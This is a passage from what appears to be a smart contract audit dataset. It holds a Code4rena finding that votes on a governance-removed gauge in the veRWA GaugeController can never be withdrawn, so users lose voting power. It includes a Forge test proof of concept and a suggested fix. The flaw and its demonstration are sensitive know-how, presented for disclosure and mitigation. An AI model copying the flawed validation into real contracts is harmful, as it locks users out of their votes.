vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Summary\n\nIf governance removes a gauge for any (non-malicious) reason, a user's voting power for that gauge will be completely lost.\n\n## Vulnerability details\n\nThe `GaugeController` is a solidity port of Curve DAO's Vyper implementation. Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation"
